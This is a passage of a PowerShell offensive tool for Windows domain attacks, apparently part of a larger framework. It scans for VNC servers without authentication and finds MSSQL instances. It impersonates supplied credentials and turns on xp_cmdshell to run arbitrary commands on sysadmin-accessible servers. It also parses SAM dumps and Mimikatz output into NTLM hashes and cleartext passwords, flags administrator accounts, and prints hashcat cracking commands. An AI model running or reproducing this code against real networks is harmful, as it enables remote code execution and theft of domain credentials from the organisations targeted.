    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                if ($result -eq "Not Supported") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 

                if ($result -eq "Handshake Error") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 
                elseif ($result -eq "Supported") {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
            } 

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: MSSQL #############################################
################################################################################################################
Function Method-MSSQL {

Add-Type -AssemblyName "System.Data"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName)

function Send-UdpDatagram {
    param ([string]$ComputerName)

    $client = New-Object net.sockets.udpclient(0)
    $client.Client.ReceiveTimeout = 100

    $send = [Byte] 0x03
    try {[void] $client.send($send, $send.length, $ComputerName, 1434)}
    Catch {return "Unable to connect"}

    $ipep = New-Object net.ipendpoint([net.ipaddress]::any, 0)
    $receive = $null
    try {
        $receive = $client.receive([ref]$ipep)
    } catch [System.Net.Sockets.SocketException] {return "Unable to connect"} 
    finally {
        try { $client.close() } Catch {}
    }


    $rawData = [text.encoding]::ascii.getstring($receive)
    $instanceFullNames = @()

    $rawData -split ';;' | ForEach-Object {
        if ($_ -match 'InstanceName;([^;]+)') {
            $instanceName = $matches[1]
            $instanceFullNames += "$ComputerName\$instanceName"
        }
    }

    $instanceFullNames
}

 return Send-UdpDatagram -ComputerName $ComputerName

}

foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
    })
}

$AllInstances = @()

function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
    $searcher.PageSize = 1000
    return $searcher
}

function Get-ADSQLInstances {
    param(
        [Parameter(Mandatory=$false)]
        [string]$LDAPFilter = "(servicePrincipalName=MSSQLSvc/*)"
    )

    # Initialize an empty array to hold all instances
    $AllInstances = @()

    # Use New-Searcher function to create the DirectorySearcher object
    $ADSearcher = New-Searcher
    $ADSearcher.Filter = $LDAPFilter
    $ADSearcher.SearchScope = "Subtree"
    
    try {
        $Results = $ADSearcher.FindAll()
        foreach ($Result in $Results) {
            $Entry = $Result.GetDirectoryEntry()
            $SPNs = $Entry.servicePrincipalName
            foreach ($SPN in $SPNs) {
                if ($SPN.StartsWith("MSSQLSvc/")) {
                    $InstanceDetails = $SPN.Replace("MSSQLSvc/", "").Split(":")
                    $ComputerName = $InstanceDetails[0]
                    $InstanceName = if ($InstanceDetails.Length -gt 1) { $InstanceDetails[1] } else { "Default" }

                    # Combine ComputerName and InstanceName
                    $FullInstanceName = if ($InstanceName -eq "Default" -or $InstanceName -eq "MSSQLSERVER") { 
                        $ComputerName.ToLower() 
                    } else { 
                        "$($ComputerName.ToLower())\$InstanceName" 
                    }

                    # Add the full instance identifier to the AllInstances array
                    $AllInstances += $FullInstanceName
                }
            }
        }
    } finally {
        $ADSearcher.Dispose()
    }

    # Return the array of all instances
    return $AllInstances
}

$AllInstances = Get-ADSQLInstances

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

            if ($result -eq "Unable to connect"){continue}

            # Foreach result, store it in the AllInstances Array
            $result | foreach { $AllInstances += $_ }

            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()
$AllInstances = $AllInstances.ToUpper()
$AllInstances = $AllInstances.Trim()
$AllInstances = $AllInstances | Select -Unique | Sort-Object

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength,
        [string]$IpAddress,
        [string]$NamedInstance
    )

    # Prefix
    Write-Host "MSSQL " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
    Write-Host "   " -NoNewline
    
    # Display ComputerName, OS, and NamedInstance
    Write-Host "$ComputerName" -noNewLine
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($NamedInstance, $Username, $Password, $LocalAuth, $Domain, $Command)

try {Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}
"@ -Language CSharp}
Catch {}
function Invoke-Impersonation {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [string]$Domain,
		
        [Parameter(Mandatory=$false)]
        [switch]$RevertToSelf
    )
	
    begin {
        # Check if RevertToSelf switch is NOT provided
        if (-not $RevertToSelf) {
            # If any of the mandatory parameters are missing, throw an error
            if (-not $Username -or -not $Password -or -not $Domain) {
                Write-Output "[-] Username, Password, and Domain are mandatory unless the RevertToSelf switch is provided."
				$PSCmdlet.ThrowTerminatingError((New-Object -TypeName System.Management.Automation.ErrorRecord -ArgumentList (New-Object Exception), "ParameterError", "InvalidArgument", $null))
            }
        }
    }

    process {
        if ($RevertToSelf) {
            if ([Advapi32]::RevertToSelf()) {
               # Write-Output "[+] Successfully reverted to original user context."
            } else {
               # Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
            }
            return
        }

        $tokenHandle = [IntPtr]::Zero

        # Use the LogonUser function to get a token
        $result = [Advapi32]::LogonUser(
            $Username,
            $Domain,
            $Password,
            [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS,
            [LogonProvider]::LOGON32_PROVIDER_DEFAULT,
            [ref]$tokenHandle
        )

        if (-not $result) {
            #Write-Output "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
            return
        }

        # Impersonate the user
        if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
            [Advapi32]::CloseHandle($tokenHandle)
            Write-Output "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
            return
        }
        #Write-Output "[+] Impersonation successful"
    }
}
Function Invoke-SqlQuery {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$NamedInstance,

        [Parameter(Mandatory=$true)]
        [string]$Query,

        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password
    )

    # Determine which connection string to use
    $ConnectionString = if ($Username -and $Password) {
        "Server=$NamedInstance;User ID=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
    } else {
        "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
    }

    try {
        # Create and open a SQL connection
        $SqlConnection = New-Object System.Data.SqlClient.SqlConnection $ConnectionString
        $SqlConnection.Open()

        # Create a SQL command object
        $SqlCommand = $SqlConnection.CreateCommand()
        $SqlCommand.CommandText = $Query

        # Execute the query and return the results
        $Result = $SqlCommand.ExecuteReader()
        $Table = New-Object System.Data.DataTable
        $Table.Load($Result)
        $Table
    }
    catch {
        Write-Error "An error occurred: $($_.Exception.Message)"
    }
    finally {
        # Dispose SQL connection and command
        if ($SqlCommand -ne $null) {
            $SqlCommand.Dispose()
        }
        if ($SqlConnection -ne $null) {
            $SqlConnection.Dispose()
        }
    }
}
function MSSQL-Command {
    [CmdletBinding()]
    param (
    [Parameter(Mandatory=$true)]
    [string]$NamedInstance,
    
    [Parameter(Mandatory=$true)]
    [string]$Command
    )
    
    # Function to revert configurations
    function Revert-Config {
        param (
            [string]$Option,
            [int]$Value
        )
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure '$Option', $Value; RECONFIGURE;"
    }

    # Store the initial states
    $advancedOptionsConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options'"
    $xpCMDConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"

    # Enable 'Show Advanced Options' if needed
    if ($advancedOptionsConfig.value_in_use -eq 0) {
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'show advanced options', 1; RECONFIGURE;"
        $revertAdvancedOptions = $true
    }

    # Enable 'xp_cmdshell' if needed
    if ($xpCMDConfig.value_in_use -eq 0) {
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        $revertXpCMDShell = $true
    }

    # Execute the provided command using xp_cmdshell
    $ExecResult = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "EXEC xp_cmdshell '$Command';"

    # Output the result as formatted text
    if ($ExecResult) {
        $TrimmedResult = $ExecResult | Format-Table -HideTableHeaders | Out-String | ForEach-Object { $_.Trim() }
        $TrimmedResult | Write-Output
    
    } else {
        Write-Host "No output was returned from the command."
    }

    # Revert 'xp_cmdshell' if it was changed
    if ($revertXpCMDShell) {
        Revert-Config -Option "xp_cmdshell" -Value 0
    }

    # Revert 'Show Advanced Options' if it was changed
    if ($revertAdvancedOptions) {
        Revert-Config -Option "show advanced options" -Value 0
    }
}

# Start Impersonation (if required)
if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){
Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
}

Function SQLAdminCheck {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $NamedInstance,
        
        [Parameter(Mandatory=$false)]
        $Username,
        
        [Parameter(Mandatory=$false)]
        $Password,
        
        [Parameter(Mandatory=$false)]
        $LocalAuth
    )

    # Determine authentication method based on provided credentials
    if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) {
        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
    } else {
        $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
    }

    try {
        # Create a SQL connection
        $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $SqlConnection.ConnectionString = $ConnectionString

        # Open the connection
        $SqlConnection.Open()

        # Create a SQL command to check sysadmin membership
        $SqlCommand = $SqlConnection.CreateCommand()
        $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"

        # Execute the query and get the result
        $IsSysAdmin = $SqlCommand.ExecuteScalar()

        # Check if the user is a sysadmin
        switch ($IsSysAdmin) {
            "1" {
                $SYSADMIN = $True
                if ($Command -ne "") {
                    return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
                } else {
                    return "SUCCESS SYSADMIN"
                }
            }
            0 {
                $SYSADMIN = $False
                return "SUCCESS NOT SYSADMIN"
            }
            default {
                $SYSADMIN = $False
                return "ERROR"
            }
        }
    } catch {
        return "ERROR"
    } finally {
        # Close the SQL connection
        if ($SqlConnection.State -eq 'Open') {
            $SqlConnection.Close()
            # Dispose the pool cache, otherwise results get skewed on next run
            [System.Data.SqlClient.SqlConnection]::ClearAllPools()
        }
    }
}


function Test-SqlConnection {
    [CmdletBinding()]
    param (
    [Parameter(Mandatory=$true)]
    [string]$NamedInstance
    )

    if (!$LocalAuth) {
        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
   } elseif ($LocalAuth) {
       $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
    }

    $connection = New-Object System.Data.SqlClient.SqlConnection
    $connection.ConnectionString = $ConnectionString

    try {
        $connection.Open()
        if ($connection.State -eq 'Open'){
        if ($Username -ne "" -and $Password -ne "") {
            return SQLAdminCheck -Username "$Username" -Password "$Password" -NamedInstance "$NamedInstance"
        } else {
            return SQLAdminCheck -NamedInstance $NamedInstance
            
            }
        }
    } catch {
        if ($_.Exception.Message -like "*Login failed for user*"){return "Access Denied"}
        elseif ($_.Exception.Message -like "*error: 26*"){return "Unable to connect"}
        else {return "ERROR"}
    } finally {
        if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){
        Invoke-Impersonation  -RevertToSelf
    }
        $connection.Close()
        [System.Data.SqlClient.SqlConnection]::ClearAllPools()
    }
}

Test-SqlConnection -NamedInstance $NamedInstance


# revert impersonation (if required)
if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){Invoke-Impersonation  -RevertToSelf}
}

foreach ($NamedInstance in $AllInstances) {
     
    $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $IPResult = $Ping.Send($ComputerNameFromInstance, 15)
    if ($IPResult.Status -eq 'Success') {
    $IP = $IPResult.Address.IPAddressToString}
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        Instance = $NamedInstance
        IPAddress = $IP
        Completed = $false
        })

}
$InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            
            if ($result -eq "Unable to connect"){continue}
            
            if ($result -eq "Access Denied"){
            if ($SuccessOnly){continue}
            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            continue
            }

            if ($result -eq "ERROR"){
            if ($SuccessOnly){continue}
            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR - $Result" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            continue
            }


            elseif ($result -eq "Success"){
            Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            continue            
            }

            elseif ($result -eq "SUCCESS SYSADMIN"){
            Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            continue            
            }
           
            
            elseif ($result -eq "SUCCESS NOT SYSADMIN"){
            Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            continue            
            }

            elseif ($Command -ne "" -and $Result -ne ""){
            Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
            Write-Output ""
            Write-output $Result
            Write-Output ""
            continue
            }

             
             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################# Function: AdminCount #########################################
################################################################################################################

function AdminCount {
    param (
        [string]$UserName,
        [System.DirectoryServices.DirectorySearcher]$Searcher
    )

    $Searcher.Filter = "(sAMAccountName=$UserName)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add("adminCount") > $null

    $user = $Searcher.FindOne()

    if ($user -ne $null) {
        $adminCount = $user.Properties["adminCount"]
        if ($adminCount -eq 1) {
            return $true
        }
    }
    return $false
}

################################################################################################################
################################################## Function: Parse-SAM #########################################
################################################################################################################
function Parse-SAM {
    $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
    if (-not $SamFull) {
        New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
    }

    Write-Host
    Write-Host
    Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
    Write-Host

    $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
    $lines = @{}

    foreach ($file in $files) {
        $fileLines = Get-Content $file

        foreach ($line in $fileLines) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }

            $lineParts = $line -split ':'
            $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            $computer = $file.BaseName -split '\.' | Select-Object -First 1
            $computerFormed = "{0}" -f $computer

            if ($lines.ContainsKey($lineWithoutNumber)) {
                $lines[$lineWithoutNumber] += "," + $computerFormed
            } else {
                $lines[$lineWithoutNumber] = $computerFormed
            }
        }
    }

    $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
    if ($duplicateLines) {
        foreach ($duplicate in $duplicateLines) {
            $line = $duplicate.Key
            $computers = $duplicate.Value -split ','
            Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
            Write-Host "$line::"
            Write-Host
        }
    }

    Write-Host
    Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
    Write-Host

    Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '\.' | Select-Object -First 1
        $ComputerFormed = "[{0}]" -f $Computer
        $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
        $content = Get-Content $_.FullName -Verbose
        $output = foreach ($line in $content) {
            $trimmedLine = $line.Trim()
            if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                $ComputerFormed + $trimmedLine
            }
        }
        $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
    }

    Start-Sleep -Seconds "3"
    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
    Get-Content "$SAM\.Sam-Full.txt"

    Write-Host ""
    Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host ""
    Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
    Write-Host ""
}


################################################################################################################
################################################# Function: Parse-LogonPassword ################################
################################################################################################################
function Parse-LogonPasswords {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds 1

    function Parse-LogonPassword {
        param (
            [string]$raw
        )

        $userInfo = @{}

        function Process-Match {
            param ([string]$match)

            $username = $domain = $NTLM = $password = $null

            foreach ($line in $match.Split("`n")) {
                switch -Regex ($line) {
                    "Username" { $username = $line.Split(":")[1].Trim() }
                    "Domain" { 
                        # Extracting the domain and keeping only the NetBIOS name
                        $domain = $line.Split(":")[1].Trim()
                        $domain = ($domain -split "\.")[0]
                    }
                    "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
                    "Password" { $password = ($line -split ":", 2)[1].Trim() }
                }
            }

            if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                $identity = "$domain\$username"

                if (-not $userInfo.ContainsKey($identity)) {
                    $userInfo[$identity] = @{}
                }

                if ($NTLM) {
                    $userInfo[$identity]["NTLM"] = $NTLM
                }

                if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                    $userInfo[$identity]["Password"] = $password
                }
            }
        }

        $patterns = @(
            "(?s)(?<=msv :).*?(?=tspkg :)",
            "(?s)(?<=tspkg :).*?(?=wdigest :)",
            "(?s)(?<=wdigest :).*?(?=kerberos :)",
            "(?s)(?<=kerberos :).*?(?=ssp :)"
        )

        foreach ($pattern in $patterns) {
            $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                $_.Matches.Value | ForEach-Object {
                    if ($_ -match "Domain") {
                        Process-Match -match $_
                    }
                }
            }
        }

        foreach ($identity in $userInfo.Keys) {
            [PSCustomObject]@{
                Identity = $identity
                NTLM = $userInfo[$identity]["NTLM"]
                Password = $userInfo[$identity]["Password"]
                Notes = ""
            }
        }
    }

    # Directory path where the text files are located.
    $LogonPasswordPath = "$LogonPasswords"

    # Retrieve all text files from the directory.
    $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt

    # Create DirectorySearcher object outside the loop
    $Searcher = New-Searcher -domain "$Domain"

    # Loop through each file in the directory.
    foreach ($File in $Files) {
        # Extract computer name (DNS Hostname) from the file name using regex.
        $Computer = $File.BaseName -replace "-LogonPasswords$", ""

        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        # Retrieve the content of the current file.
        $FileOutput = Get-Content -Raw -Path $File.FullName

        # Parse the Mimikatz output and include ComputerName.
        $ParsedResults = Parse-LogonPassword -raw $FileOutput
        # Update each user's notes if they have an AdminCount of 1
        foreach ($user in $ParsedResults) {
            if ($null -ne $user.Identity) {
                $username = $user.Identity.Split('\')[1]
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $user.Notes = "[AdminCount=1] "
                }
            }
        }

        $ParsedResults |
        Where-Object { $_.NTLM -or $_.Password } |
        ForEach-Object {
            $notesAdditions = @()
            New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$LogonPasswords\$Computer"

            $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity

            if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
            if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
            if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
            if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }

            # Check if NTLM value indicates an empty password
            if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                $notesAdditions += "[NTLM=Empty Password] "
            }

            if ($($_.Password) -ne $null){
                # Extract username from Identity
                $userName = ($_.Identity -split '\\')[1]  

                # Check if username does not end with $
                if($userName -notmatch '\$$'){
                    $notesAdditions += "[Cleartext Password] "
                }
            }

            $_.Notes += ($notesAdditions -join ' ')

            Write-Host "Username  : $($_.Identity.ToLower())"
            Write-Host "NTLM      : $($_.NTLM)"
            if ($($_.Password) -eq $null) {} Else {Write-Host "Password  : $($_.Password)"}
            if (($_.Notes) -eq ""){} Else {
            Write-Host "Notes     : " -NoNewline

            # Highlight notes in yellow if it contains specific flags
            if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
                Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
            } else {
                Write-Host -NoNewline "$($_.Notes)"
            }
            Write-Host ""
            Write-Host ""
            "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
            }
            
            Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
        }
    }

    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
    # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
    $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object {$_ -notmatch ":$"}
    $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

    # Print unique NTLM hashes within the banner
    Write-Host
    Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
    Write-Host
    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
    Write-Host
    Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host 
    Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
    Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
}




################################################################################################################
################################################# Function: Parse-eKeys ########################################
################################################################################################################
Function Parse-eKeys {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds "1"
    $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

    # Initialize the DirectorySearcher outside of the loop for better performance
    $domainSearcher = New-Searcher

    Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
        
        New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
        $ComputerDirectory = "$eKeys\$Computer"
        
        Write-Host
        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        $filePath = $_.FullName
        $fileContent = Get-Content -Path $filePath -Raw
        Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

        $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
        $matches = [regex]::Matches($fileContent, $pattern)

        $uniqueGroups = @{}

        foreach ($match in $matches) {
            $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
            if (([regex]::Matches($password, ' ')).Count -gt 10) {
                $password = "(Hex Value: Redacted)"
            }            
            
            $domainUsername = "$($domain.ToLower())\$username"
            $groupKey = $domainUsername

            if (!$uniqueGroups.ContainsKey($groupKey)) {
                $notes = ""  # This will store the notes

                # Check for non-null passwords and username not ending with $
